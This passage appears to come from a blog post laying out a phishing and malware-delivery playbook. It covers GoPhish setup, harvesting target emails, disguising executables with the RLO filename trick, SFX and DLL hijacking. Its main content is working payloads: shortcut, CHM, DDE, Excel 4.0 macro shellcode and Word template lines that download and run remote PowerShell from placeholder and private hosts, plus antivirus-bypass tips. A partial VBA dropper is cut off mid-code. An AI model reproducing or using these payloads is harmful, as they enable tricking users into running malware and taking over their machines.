<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;admin_server&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;listen_url&quot;</span>: <span class="string">&quot;0.0.0.0:xx&quot;</span>, <span class="comment">// port to manage (https)</span></span><br><span class="line">		<span class="attr">&quot;use_tls&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">		<span class="attr">&quot;cert_path&quot;</span>: <span class="string">&quot;gophish_admin.crt&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;key_path&quot;</span>: <span class="string">&quot;gophish_admin.key&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">&quot;phish_server&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;listen_url&quot;</span>: <span class="string">&quot;0.0.0.0:xxxx&quot;</span>, <span class="comment">// port to phish (https)</span></span><br><span class="line">		<span class="attr">&quot;use_tls&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">		<span class="attr">&quot;cert_path&quot;</span>: <span class="string">&quot;example.crt&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;key_path&quot;</span>: <span class="string">&quot;example.key&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">&quot;db_name&quot;</span>: <span class="string">&quot;sqlite3&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;db_path&quot;</span>: <span class="string">&quot;gophish.db&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;migrations_prefix&quot;</span>: <span class="string">&quot;db/db_&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;contact_address&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;logging&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;filename&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;level&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Start server, and it will show the initial username &amp; password.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─<span class="comment"># ./gophish</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:08+08:00&quot;</span> level=warning msg=<span class="string">&quot;No contact address has been configured.&quot;</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:08+08:00&quot;</span> level=warning msg=<span class="string">&quot;Please consider adding a contact_address entry in your config.json&quot;</span></span><br><span class="line">goose: migrating db environment <span class="string">&#x27;production&#x27;</span>, current version: 0, target: 20200730000000</span><br><span class="line">OK    20160118194630_init.sql</span><br><span class="line">OK    20160131153104_0.1.2_add_event_details.sql</span><br><span class="line">...</span><br><span class="line">OK    20200619000000_0.11.0_password_policy.sql</span><br><span class="line">OK    20200730000000_0.11.0_imap_ignore_cert_errors.sql</span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Please login with the username admin and the password e98a19c956ca1cc2&quot;</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Starting phishing server at http://0.0.0.0:xxx&quot;</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Starting IMAP monitor manager&quot;</span></span><br></pre></td></tr></table></figure>

<p>As for EwoMail, it has detailed documents.</p>
<p>Collect target email:</p>
<ul>
<li><a class="link"   href="https://hunter.io/" >https://hunter.io/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://www.skymem.info/" >http://www.skymem.info/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.email-format.com/i/search/" >https://www.email-format.com/i/search/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/bit4woo/teemo" >https://github.com/bit4woo/teemo<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/laramies/theHarvester" >https://github.com/laramies/theHarvester<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Verify email:</p>
<ul>
<li><a class="link"   href="https://mailtester.com/testmail.php" >https://mailtester.com/testmail.php<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/Tzeross/verifyemail" >https://github.com/Tzeross/verifyemail<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/angusluk/MailTester" >https://github.com/angusluk/MailTester<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Fake an account</p>
<ul>
<li><a class="link"   href="http://www.jetmore.org/john/code/swaks/" >http://www.jetmore.org/john/code/swaks/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://tool.chacuo.net/mailanonymous" >http://tool.chacuo.net/mailanonymous<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://tool.chacuo.net/mailsend" >http://tool.chacuo.net/mailsend<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h2 id="Camouflage-Malicious-PE"><a href="#Camouflage-Malicious-PE" class="headerlink" title="Camouflage Malicious PE"></a>Camouflage Malicious PE</h2><p>FIrst of all we need PE backdoor which can be created by using <a href="/2020/03/12/2020-03-12-Domain-Pentest-Intro/#Pentest-framework">Pentest Frameworks</a>.</p>
<p>Or we can prepare evil Powershell scripts using MSF, CobaltStrike, <a class="link"   href="https://github.com/EmpireProject/Empire" >Empire<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/trustedsec/unicorn" >Unicorn<i class="fas fa-external-link-alt"></i></a>, and pack it up as an executable using tools like <a class="link"   href="https://github.com/tokyoneon/B2E/raw/master/Bat_To_Exe_Converter.zip" >BAT2EXE<i class="fas fa-external-link-alt"></i></a>.</p>
<p>We can setup to use or leverage the portable version. Add a <code>notepad.exe</code> at the front as a disguise, and remember to set a reliable icon (can be found at <a class="link"   href="https://github.com/B00merang-Artwork/Windows-10" >Windows 10 Icon theme<i class="fas fa-external-link-alt"></i></a>) and right PE format.<br><img src="/imghost/gp/1.png" alt="notepad as a disguise"><br><img src="/imghost/gp/2.png" alt="icon and format"></p>
<p>After that we get <code>xxx.exe</code>, and here the most important tip appears – Unicode of RLO. It converts filename to write from the right to the left. Use <code>insert</code> in right click menu, or visit online tools like <a class="link"   href="https://unicode-table.com/en/202E/" >Unicode Character Table<i class="fas fa-external-link-alt"></i></a> to do it.</p>
<p>For example, if we name a file: <code>Altxt.exe</code>, and <code>insert</code> RLO right before the <code>txt.exe</code>, finally we get name <code>Alexe.txt</code> and it is still a PE file.</p>
<p><a href="Restorator">Restorator</a> can be used to edit resource of a PE file.</p>
<h3 id="SFX"><a href="#SFX" class="headerlink" title="SFX"></a>SFX</h3><p>Create a SFX(SelF-eXtracting) file and compress in some confusing binaries. Set Advanced settings of SFX:</p>
<ul>
<li>before extraction, run a normal PE; after extraction, run the malware.</li>
<li>configure the silence mode to <code>hide all</code>.</li>
<li><code>update</code> and <code>overlap</code> files when extracting.</li>
</ul>
<h3 id="DLL-Hijacking-amp-Recreate-the-Installer"><a href="#DLL-Hijacking-amp-Recreate-the-Installer" class="headerlink" title="DLL Hijacking &amp; Recreate the Installer"></a>DLL Hijacking &amp; Recreate the Installer</h3><p>They are also common methods to execute malware, and here provide some sample tools:</p>
<ul>
<li><a class="link"   href="https://github.com/strivexjun/AheadLib-x86-x64" >AheadLib<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/coca1ne/DLL_Hijacker" >DLL_Hijacker<i class="fas fa-external-link-alt"></i></a></li>
<li>other dll hijacking tools</li>
<li><a class="link"   href="https://nsis.sourceforge.io/Download" >NSIS<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://jrsoftware.org/isinfo.php" >Inno Setup<i class="fas fa-external-link-alt"></i></a></li>
<li>Easy setup</li>
</ul>
<h2 id="Make-Evil-Links-x2F-Shotcuts"><a href="#Make-Evil-Links-x2F-Shotcuts" class="headerlink" title="Make Evil Links&#x2F;Shotcuts"></a>Make Evil Links&#x2F;Shotcuts</h2><p>We can create a blank shotcut, and modify the target command.</p>
<p>For example, <code>ftp</code> can be used to execute commands by adding <code>!</code>:  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ftp</span><br><span class="line">ftp&gt; whoami</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">root</span><br><span class="line">ftp&gt; !echo 222</span><br><span class="line">222</span><br><span class="line">ftp&gt; !pwd</span><br><span class="line">/root</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>
<p>So on Windows the <code>ftp.exe</code> can cooperate with <code>powershell</code> scripts.<br>In <code>Target</code> of the <code>Shotcut</code> we write: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Winodws\System32\ftp.exe -&quot;&quot;s:xxx.dll</span><br></pre></td></tr></table></figure>
<p>In <code>xxx.dll</code> we write: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!cmd /k powershell -exec bypass .\xxxx.ps1</span><br></pre></td></tr></table></figure>
<p>And in <code>xxxx.ps1</code> writes:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:xx/xxxxx&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>In this indirectly calling method, some antivirus softwares can be bypassed. Other methods of calling powershell are also applicable, and encodings like base64 are recommended.</p>
<p>The name of icon of the file should be modified to deceive others.</p>
<h2 id="Evil-CHM-to-Phish"><a href="#Evil-CHM-to-Phish" class="headerlink" title="Evil CHM to Phish"></a>Evil CHM to Phish</h2><p>CHM (Microsoft Compiled HTML Help) is the extension used by Windows help files and other files such as e-books. Cybercriminals have been known to abuse vulnerabilities in CHM files to execute arbitrary code. Successful exploitation requires the user is tricked into opening or decompiling a malicious CHM file, which may be used to execute malicious routines the same way a malicious EXE file would.</p>
<p>First create an empty folder, and a html file:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,calc.exe&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Attention: a <code>,</code> before <code>calc.exe</code> is needed to avoid chm error when opening.</p>
<p>Use EasyCHM or other tools to produce CHM files based on html, and click to trigger payload. replace payload with powershell to get trojan online.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:xx/xxxxx&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Attention: a <code>,</code> right after <code>powershell.exe</code> is also needed to avoid error, and take care of conflicts between <code>&quot;</code> and <code>&#39;</code>.</p>
<p>Another method is to leverage <a class="link"   href="https://github.com/Ridter/MyJSRat" >MyJSRat<i class="fas fa-external-link-alt"></i></a>. The payload in CHM should connect <code>MyJSRat</code> server (control indirectly), and <code>MyJSRat</code> control the victim to execute powershell backdoor downloading&amp;execution. </p>
<p>The CHM content can be like: (using whitelist and clean traces)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,rundll32.exe, javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.27.180:8081/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>To disguise the CHM file, we make a malicious file based on a normal one.</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hh -decompile .\\html xxx.chm</span><br></pre></td></tr></table></figure>
<p>Then embed payload into one html page, and make sure to induce people to click this page.</p>
<h2 id="Create-Evil-Office-Suite"><a href="#Create-Evil-Office-Suite" class="headerlink" title="Create Evil Office Suite"></a>Create Evil Office Suite</h2><h3 id="Macros-in-Word"><a href="#Macros-in-Word" class="headerlink" title="Macros in Word"></a>Macros in Word</h3><p>Enable developing tools, and adjust the safety of macros to enable all macros in word.<br>Then click <code>Visual Basic</code> to write payload (generate in MSF&#x2F;CS).</p>
<p>Use <a class="link"   href="https://github.com/outflanknl/EvilClippy" >EvilClippy<i class="fas fa-external-link-alt"></i></a> to bypass AV.</p>
<h3 id="Macros-in-Excel"><a href="#Macros-in-Excel" class="headerlink" title="Macros in Excel"></a>Macros in Excel</h3><p>Right click the <code>Sheet</code> tab, and select <code>insert</code>. Choose the macro item to add a new sheet tab.</p>
<p>Enter <code>=exec(&quot;c:\windows\system32\cmd.exe&quot;)</code> in cell <code>A1</code> and enter <code>=halt()</code> in cell <code>A2</code>. Set cell <code>A1</code> as <code>Auto_open</code> and save it as xlsm file .</p>
<p>exploits on the internet:</p>
<figure class="highlight vb"><table><tr><td class="code"><pre><span class="line">=R1C2()  // <span class="keyword">call</span> somewhere </span><br><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Kernel32&quot;</span>,<span class="string">&quot;VirtualAlloc&quot;</span>,<span class="string">&quot;JJJJJ&quot;</span>,<span class="number">0</span>,<span class="number">1000000</span>,<span class="number">4096</span>,<span class="number">64</span>)  // invoke Kernel</span><br><span class="line">=<span class="keyword">SELECT</span>(R1C2:R1000:C2,R1C2)  // choose shellcode column</span><br><span class="line">=<span class="keyword">SET</span>.VALUE(R1C3, <span class="number">0</span>)  // <span class="keyword">set</span> one cell</span><br><span class="line">=<span class="keyword">WHILE</span>(LEN(ACTIVE.CELL())&gt;<span class="number">0</span>)  </span><br><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Kernel32&quot;</span>,<span class="string">&quot;WriteProcessMemory&quot;</span>,<span class="string">&quot;JJJCJJ&quot;</span>,-<span class="number">1</span>, R2C1 + R1C3 * <span class="number">20</span>,ACTIVE.CELL(), LEN(ACTIVE.CELL()), <span class="number">0</span>)</span><br><span class="line">=<span class="keyword">SET</span>.VALUE(R1C3, R1C3 + <span class="number">1</span>)</span><br><span class="line">=<span class="keyword">SELECT</span>(, <span class="string">&quot;R[1]C&quot;</span>)</span><br><span class="line">=<span class="keyword">NEXT</span>()   // <span class="keyword">loop</span> shellcode, <span class="keyword">call</span> RtilCopyMemory <span class="keyword">to</span> write memory. </span><br><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Kernel32&quot;</span>,<span class="string">&quot;CreateThread&quot;</span>,<span class="string">&quot;JJJJJJJ&quot;</span>,<span class="number">0</span>, <span class="number">0</span>, R2C1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)  //<span class="keyword">call</span> CreateThread <span class="keyword">to</span> create thread</span><br><span class="line">=HALT() // <span class="built_in">or</span> <span class="keyword">RETURN</span> <span class="keyword">to</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>To bypass waf, or make shellcode available:</p>
<ul>
<li><a class="link"   href="https://github.com/sevagas/macro_pack" >macro_pack<i class="fas fa-external-link-alt"></i></a> automatizes obfuscation and generation of retro formats such as MS Office documents or VBS like format.</li>
<li><a class="link"   href="https://github.com/mdsecactivebreach/SharpShooter" >SharpShooter<i class="fas fa-external-link-alt"></i></a> is a payload creation framework for the retrieval and execution of arbitrary CSharp source code.</li>
<li><a class="link"   href="https://github.com/michaelweber/Macrome" >Macrome<i class="fas fa-external-link-alt"></i></a> is An Excel Macro Document Reader&#x2F;Writer.</li>
<li>The site with <a class="link"   href="https://www.certego.net/en/news/advanced-vba-macros/" >advanced-vba-macros<i class="fas fa-external-link-alt"></i></a>.</li>
</ul>
<p>and some old stuff </p>
<ul>
<li><a class="link"   href="https://github.com/curi0usJack/luckystrike" >luckystrike<i class="fas fa-external-link-alt"></i></a> uses COM obj to insert payload into Office document.</li>
<li><a class="link"   href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads" >Office-DDE-Payloads<i class="fas fa-external-link-alt"></i></a> uses DDE to execute payload.</li>
<li><a class="link"   href="https://github.com/mwrlabs/wePWNise" >wePWNise<i class="fas fa-external-link-alt"></i></a> converts payload to VBA scripts.</li>
<li><a class="link"   href="https://github.com/khr0x40sh/MacroShop" >MacroShop<i class="fas fa-external-link-alt"></i></a> is a collection of scripts to aid in delivering payloads via Office Macros.</li>
<li><a class="link"   href="https://github.com/3gstudent/Worse-PDF" >Worse-PDF<i class="fas fa-external-link-alt"></i></a> to produce malicious PDF.</li>
</ul>
<h3 id="OLE"><a href="#OLE" class="headerlink" title="OLE"></a>OLE</h3><p>Abbreviation of Object Linking and Embedding, is a compound document standard developed by Microsoft Corporation. It enables you to create objects with one application and then link or embed them in a second application. Embedded objects retain their original formatand links to the application that created them.</p>
<p>In openoffice we can use <code>DDE</code> function: <code>=DDE(&quot;cmd&quot;;&quot;/C calc&quot;;&quot;123&quot;)</code> to execute, while in office it is removed.</p>
<p>But we can still use the format <code>application|topic!item</code> to call <code>DDE</code>.</p>
<p>In excel (bit of confusing):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=cmd|&#x27;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(&quot;http://XXXX/getshell.ps1&quot;);IEX $e&#x27;!_xlbgnm.A1</span><br></pre></td></tr></table></figure>
<p>In word:<br><code>CTRL+F9</code> and insert between “{ }” </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; DDEAUTO c:\windows\system32\cmd.exe &quot;/k calc.exe&quot; &#125;</span><br><span class="line">or</span><br><span class="line">&#123;DDEAUTO C:\\windows\\system32\\cmd.exe &quot;/k powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://x.x.x.x/xx.ps2&#x27;) &quot;&#125;</span><br></pre></td></tr></table></figure>
<p>And listen in MSF:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/fileformat/office_dde_delivery</span><br><span class="line">set lport xx</span><br><span class="line">set lhost xx.xx.xx.xx</span><br></pre></td></tr></table></figure>

<h3 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h3><p>If we insert online videos in word, the item <code>embeddedHtml</code> in <code>word/document.xml</code> of word compressed file will have corresponding html codes. We can modify these html to insert evil javascript, like:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(a);</span></span><br><span class="line"><span class="javascript">a.style = <span class="string">&#x27;display: none&#x27;</span>;</span></span><br><span class="line"><span class="javascript">a.href = <span class="string">&quot;http://x.x.x.x:xx/xxx&quot;</span>;</span></span><br><span class="line"><span class="javascript">a.download = fileName;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.URL.revokeObjectURL(url);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">a.click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h3><p>First create a document with template, then create a template which enables macro. Modify the document with template, to let it link to the template we created.<br>Write macro in template <code>xxx.dotm</code>:</p>
<figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">Shell <span class="string">&quot;calc&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
<p>Or find <code>word_rels\settings.xml.rels</code> in <code>xxx.docx</code> which enables template. Set <code>Target</code> as <code>file:///C:\path\to\xxx.dotm</code>, and the protocol can be changed to <code>smb</code> or <code>http</code>.</p>
<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>There’re also many command execution vulnerabilities:<br><a class="link"   href="https://github.com/bhdresh/CVE-2017-0199" >CVE-2017-0199<i class="fas fa-external-link-alt"></i></a>, CVE-2017-8570, CVE-2017-8759, <a class="link"   href="https://github.com/Ridter/CVE-2017-11882/" >CVE-2017-11882<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/rxwx/CVE-2018-0802" >CVE-2018-0802<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Phish-in-PPSX"><a href="#Phish-in-PPSX" class="headerlink" title="Phish in PPSX"></a>Phish in PPSX</h3><p>We can insert an action button, and set the reaction when clicking&#x2F;hovering as powershell scripts.</p>
<p>Save it as ppsx, and execute it to get backdoor online. In word it has similar methods, and these may be the most effective.</p>
<h3 id="The-Ultra-One"><a href="#The-Ultra-One" class="headerlink" title="The Ultra One"></a>The Ultra One</h3><ol>
<li>Find the target to hijack DLL, and create a malicious DLL. </li>
<li>Read all files in binary and encode to a string by base64 and save it in a textbox</li>
<li>Use the macros to decode from textbox and write to disk. </li>
<li>Finally execute to be online.</li>
</ol>
<p>Talk is cheap, show XX the code.</p>
<p>Read file and encode by base64:</p>
<figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Sub</span> WriteBinary(FileName, Buf)</span><br><span class="line">  <span class="keyword">Dim</span> I, aBuf, Size, bStream</span><br><span class="line">  Size = UBound(Buf): <span class="keyword">ReDim</span> aBuf(Size \ <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">For</span> I = <span class="number">0</span> <span class="keyword">To</span> Size - <span class="number">1</span> <span class="keyword">Step</span> <span class="number">2</span></span><br><span class="line">      aBuf(I \ <span class="number">2</span>) = ChrW(Buf(I + <span class="number">1</span>) * <span class="number">256</span> + Buf(I))</span><br><span class="line">  <span class="keyword">Next</span></span><br><span class="line">  <span class="keyword">If</span> I = Size <span class="keyword">Then</span> aBuf(I \ <span class="number">2</span>) = ChrW(Buf(I))</span><br><span class="line">  aBuf = <span class="keyword">Join</span>(aBuf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">Set</span> bStream = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">  bStream.Type = <span class="number">1</span>: bStream.Open</span><br><span class="line">  <span class="keyword">With</span> CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">    .Type = <span class="number">2</span>: .Open: .WriteText aBuf</span><br><span class="line">    .Position = <span class="number">2</span>: .CopyTo bStream: .Close</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">  bStream.SaveToFile FileName, <span class="number">2</span>: bStream.Close</span><br><span class="line">  <span class="keyword">Set</span> bStream = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Base64Encode(str() <span class="keyword">As</span> <span class="type">Byte</span>) <span class="keyword">As</span> <span class="type">String</span>     </span><br><span class="line">    <span class="keyword">On</span> <span 